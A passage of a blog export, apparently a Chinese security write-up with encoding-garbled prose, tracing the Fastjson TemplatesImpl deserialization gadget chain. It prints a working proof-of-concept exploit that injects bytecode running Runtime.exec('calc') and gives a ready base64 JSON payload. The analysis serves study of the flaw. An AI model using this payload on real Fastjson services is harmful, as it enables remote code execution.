        <tag>apache shiro</tag>
        <tag>è®¤è¯ç»•è¿‡</tag>
        <tag>CVE-2022-32532</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjsonååºåˆ—åŒ–æ¼æ´TemplateImplåˆ©ç”¨é“¾æ¡è·Ÿè¸ªä¸åˆ†æ</title>
    <url>/archives/4187a059.html</url>
    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ETemplateImpl%E5%88%A9%E7%94%A8%E9%93%BE%E6%9D%A1%E8%B7%9F%E8%B8%AA%E4%B8%8E%E5%88%86%E6%9E%90">TOC</a></p>
<p>æˆ‘ä»¬çŸ¥é“Fastjsonåœ¨è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å½“å‰ç±»çš„æ‰€æœ‰getteræ–¹æ³•å»è·å–æ‰€æœ‰publicæˆå‘˜å˜é‡çš„å€¼ï¼Œåƒè¿™æ ·ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"><span class="comment">//        String s1 = &quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        JSONObject jsonObject = JSON.parseObject(s1);</span></span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>ä¸Šé¢ä»£ç å¯¹FastjsonUnserilizeTestç±»çš„ä¸€ä¸ªå¯¹è±¡è¿›è¡Œäº†åºåˆ—åŒ–ï¼Œè¿™å°†ä¼šè°ƒç”¨FastjsonUnserilizeTestä¸­çš„æ‰€æœ‰getterã€‚æœ€ç»ˆçš„ç»“æœä¸ºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1db44ff51eb95e9d8a305037594671d8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†getterï¼Œæˆ‘ä»¬FastjsonUnserilizeTestç±»çš„ä»£ç æ˜¯è¿™æ ·å†™çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getnameæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setnameæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†getageæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†setageæ–¹æ³•ï¼&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ageçš„åˆå§‹å€¼ä¸º0ï¼Œç¬¦åˆæˆ‘ä»¬çš„è¾“å‡ºã€‚<br>æˆ‘ä»¬åœ¨çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s1);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å€™çš„è¾“å‡ºä¸ºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ae3d41db6032e545a2d41f6cd3306b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°ååºåˆ—åŒ–çš„æ—¶å€™åªè°ƒç”¨äº†æ‰€æœ‰setterï¼Œæˆ‘ä»¬å°†ä»£ç å˜åŒ–ä¸€ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setAge(20);</span></span><br><span class="line"><span class="comment">//        fastjsonUnserilizeTest.setName(&quot;armandhenewpy&quot;);</span></span><br><span class="line"><span class="comment">//        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span></span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.armandhe.javabase.FastjsonUnserilizeTest\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;armandhenewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s1);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶çš„è¾“å‡ºä¸ºï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0f871300306c9def040ce2a9d60ff77f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§‚å¯Ÿåˆ°ä½¿ç”¨parseObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–æ¯”ä½¿ç”¨parseæ–¹æ³•è¿›è¡Œå‘åºåˆ—åŒ–é¢å¤–è°ƒç”¨äº†æ‰€æœ‰çš„getteræ–¹æ³•ã€‚è¿™æ˜¯åº”ä¸ºparseObjectæ–¹æ³•æ˜¯å¯¹parseæ–¹æ³•çš„å†ä¸€æ¬¡å°è£…ã€‚parseååºåˆ—åŒ–ç”Ÿæˆçš„æ˜¯ä¸€ä¸ªObjectå¯¹è±¡ï¼Œè€ŒparseObjectå´æ˜¯ä¸€ä¸ªJsonObjectå¯¹è±¡ï¼Œæ­£æ˜¯è¿™ä¸ªè§’è‰²çš„è£…æ¢ä½¿å¾—parseObjectå¤šè°ƒç”¨äº†ä¸€æ¬¡æ‰€å“Ÿé€‡getteræ–¹æ³•ã€‚<br>æˆ‘ä»¬çš„TemplateImplåˆ©ç”¨é“¾æ¡ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†parseObjectçš„è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å¯ä»¥è·Ÿä¸€ä¸‹parseObjectæ–¹æ³•ï¼Œæœ€åè·Ÿåˆ°äº†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e64c07bafaec2456193b65a3a30b034c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªæ–¹æ³•é¦–å…ˆè°ƒç”¨äº†parseè¿›è¡Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªObjectå¯¹è±¡ï¼Œç„¶åæ˜¯ä¸€ä¸ªä¸‰å…ƒè¿ç®—æ³•ï¼Œåˆ¤æ–­objæ˜¯å¦æ˜¯JSONObjectçš„å®ä¾‹ï¼Œå¾ˆæ˜æ˜¾ä¸æ˜¯çš„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨toJSONæ–¹æ³•ï¼Œç»§ç»­è·Ÿåˆ°toJSONæ–¹æ³•é‡Œé¢ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c9ad0b9063671b41ca96d2601723db5f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº†é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿåˆ°äº†è¿™ä¸€æ­¥ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/20b1cb2630c86569dddb4d26e33d4c6b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­¤æ—¶æŸ¥çœ‹å€¼ï¼š</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0a7c061ea34cc5dfacff44acb6d61e51.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å·²ç»è·å¾—äº†æ‰€æœ‰çš„getterï¼Œè·Ÿåˆ°getFieldValuesMapæ–¹æ³•é‡Œé¢å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/47ddde20e74f4158fc36b2fc5714a65a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°ageä¸nameçš„å€¼è¢«å–å‡ºæ¥äº†ï¼Œè¿™é‡Œè‚¯å®šå·²ç»è°ƒç”¨äº†getteræ–¹æ³•äº†ï¼Œçœ‹æ·¡ä¸Šé¢æœ‰ä¸ªgetter.getPorpertyValueæ–¹æ³•æ¯”è¾ƒå¯ä»¥ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯è·å–å€¼å¾—æ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/102d2742a5cb87d304247b8fe38b58db.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶è¿™é‡Œè·å–åˆ°äº†ageçš„å€¼ã€‚<br>ä»ä¸Šé¢çš„è¿‡ç¨‹æ¥çœ‹ï¼ŒparseObjectæ–¹æ³•åœ¨è°ƒç”¨çš„æ—¶å€™ä¼šè°ƒç”¨toJSONæ–¹æ³•å°†Objectç±»å‹è½¬æ¢ä¸ºJSONObjectç±»å‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šè°ƒç”¨æ‰€æœ‰çš„getteræ–¹æ³•ã€‚è¿™ä¸ªæˆ‘ä»¬çš„åˆ©ç”¨é“¾æˆç«‹çš„å‰æã€‚<br>æˆ‘æ»¡æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬æœ€ç»ˆåˆ©ç”¨çš„payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.util.JavaBeanInfo;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Launcher.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTemplatesImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">evilCode</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">aDefault</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> aDefault.get(evilCode.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">RandomClassName</span> <span class="operator">=</span> <span class="string">&quot;armandhe&quot;</span>+System.nanoTime();</span><br><span class="line">        ctClass.setName(RandomClassName);</span><br><span class="line">        ctClass.setSuperclass((aDefault.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> Base64.encodeBase64String(bytes);</span><br><span class="line"><span class="comment">//            System.out.println(s1);</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DESERILIZATION_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + DESERILIZATION_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"><span class="comment">//            System.out.println(jsonString);</span></span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">parserConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line"><span class="comment">//            TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//            System.out.println(JSON.toJSONString(templates, SerializerFeature.WriteClassName));</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class, parserConfig, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ–è€…ä½¿ç”¨ä¸‹é¢è¿™ä¸ªPOC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.DOM;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span></span><br><span class="line"><span class="comment">//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//import java.io.IOException;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//public class Test extends AbstractTranslet &#123;</span></span><br><span class="line"><span class="comment">//    public Test() throws IOException &#123;</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        Test t = new Test();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ ¸å¿ƒéƒ¨åˆ†å°±æ˜¯jsonStringè¿™ä¸€éƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>@type è¡¨ç¤ºéœ€è¦å°†ç»™å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä»€ä¹ˆç±»å‹</li>
<li>_bytecodes å°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„payloadï¼Œå…¶å®å°±æ˜¯</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è½¬æ¢ä¸ºå­—èŠ‚ç å†è¿›è¡Œbase64ç¼–ç </p>
<ul>
<li>_name </li>
<li>_tfactory</li>
<li>_outputProperties ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„æ¼æ´å…¥å£äº†ï¼Œå› ä¸ºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº†è¯¥å±æ€§çš„getteræ–¹æ³•ï¼Œå³getOutputPropertiesæ–¹æ³•ã€‚</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f7a1b4cb0394e0312665e69c8aa17559.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº†newTransformeræ–¹æ³•ï¼Œè·Ÿè¿›ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a940036dea76980597a5d109b591486b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
